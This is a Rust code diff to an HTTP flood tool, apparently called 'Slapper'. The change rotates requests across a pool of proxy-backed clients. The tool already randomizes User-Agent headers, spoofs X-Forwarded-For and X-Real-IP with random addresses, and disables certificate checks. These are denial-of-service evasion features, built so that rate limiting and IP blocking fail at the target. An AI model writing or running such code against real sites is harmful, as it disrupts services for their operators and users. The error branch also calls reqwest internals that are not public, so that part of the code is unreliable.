@@ -33,7 +33,9 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
         None
     };
 
-    let client = build_client(config, proxy_manager.as_ref()).await?;
+    let clients = build_clients(config, proxy_manager.as_ref()).await?;
+    let total_requests = config.rate_pps * config.duration_secs;
+    let mut proxy_index = 0usize;
 
     let progress = Arc::new(ProgressBar::new(config.duration_secs));
     progress.set_style(
@@ -52,12 +54,18 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
     metrics.start();
 
     let mut handles = Vec::with_capacity(total_requests);
-    let total_requests = config.rate_pps * config.duration_secs;
     let _requests_per_second = config.rate_pps;
 
     for _ in 0..total_requests {
         let permit = semaphore.clone().acquire_owned().await.map_err(|e| SlapperError::Runtime(e.to_string()))?;
-        let client = client.clone();
+        let client = if clients.is_empty() {
+            None
+        } else {
+            proxy_index = proxy_index % clients.len();
+            let client = clients[proxy_index].clone();
+            proxy_index += 1;
+            Some(client)
+        };
         let url = target_url.clone();
         let metrics = metrics.clone();
         let _progress = progress.clone();
@@ -65,17 +73,24 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
         let handle = tokio::spawn(async move {
             let _request_start = Instant::now();
 
-            let result = client
-                .get(&url)
-                .header("User-Agent", random_user_agent())
-                .header("Accept", "*/*")
-                .header("Accept-Language", "en-US,en;q=0.9")
-                .header("Cache-Control", "no-cache")
-                .header("Pragma", "no-cache")
-                .header("X-Forwarded-For", random_ip())
-                .header("X-Real-IP", random_ip())
-                .send()
-                .await;
+            let result: Result<reqwest::Response, reqwest::Error> = if let Some(client) = client {
+                client
+                    .get(&url)
+                    .header("User-Agent", random_user_agent())
+                    .header("Accept", "*/*")
+                    .header("Accept-Language", "en-US,en;q=0.9")
+                    .header("Cache-Control", "no-cache")
+                    .header("Pragma", "no-cache")
+                    .header("X-Forwarded-For", random_ip())
+                    .header("X-Real-IP", random_ip())
+                    .send()
+                    .await
+            } else {
+                Err(reqwest::Error::new(
+                    reqwest::error::Kind::Request,
+                    Some(std::io::Error::new(std::io::ErrorKind::Other, "no proxy available").into()),
+                ))
+            };
 
             match result {
                 Ok(response) => {
@@ -100,28 +115,47 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
     Ok(metrics.to_stats())
 }
 
-async fn build_client(
+async fn build_clients(
     config: &StressConfig,
     proxy_manager: Option<&ProxyManager>,
-) -> Result<reqwest::Client> {
+) -> Result<Vec<reqwest::Client>> {
     let max_connections = config.concurrency.max(200);
 
-    let mut builder = reqwest::Client::builder()
+    if let Some(manager) = proxy_manager {
+        let healthy_proxies = manager.get_all_healthy_proxies().await;
+        if healthy_proxies.is_empty() {
+            let client = build_base_client(max_connections)?;
+            return Ok(vec![client]);
+        }
+
+        let mut clients = Vec::with_capacity(healthy_proxies.len());
+        for proxy_entry in healthy_proxies {
+            let mut builder = build_base_client_builder(max_connections);
+            builder = builder.proxy(build_reqwest_proxy(&proxy_entry)?);
+            clients.push(builder.build()?);
+        }
+        Ok(clients)
+    } else {
+        let client = build_base_client(max_connections)?;
+        Ok(vec![client])
+    }
+}
+
+fn build_base_client(max_connections: usize) -> Result<reqwest::Client> {
+    build_base_client_builder(max_connections).build().map_err(|e| {
+        SlapperError::Runtime(format!("Failed to build HTTP client: {}", e))
+    })
+}
+
+fn build_base_client_builder(max_connections: usize) -> reqwest::ClientBuilder {
+    reqwest::Client::builder()
         .timeout(Duration::from_secs(30))
         .danger_accept_invalid_certs(true)
         .pool_max_idle_per_host(max_connections.min(100))
         .pool_idle_timeout(Duration::from_secs(30))
         .connect_timeout(Duration::from_secs(5))
         .tcp_keepalive(Duration::from_secs(60))
-        .tcp_nodelay(true);
-
-    if let Some(proxy) = proxy_manager {
-        if let Some(proxy_entry) = proxy.get_healthy_proxy().await {
-            builder = builder.proxy(build_reqwest_proxy(&proxy_entry)?);
-        }
-    }
-
-    Ok(builder.build()?)
+        .tcp_nodelay(true)
 }
 
 fn build_reqwest_proxy(proxy: &ProxyEntry) -> Result<reqwest::Proxy> {
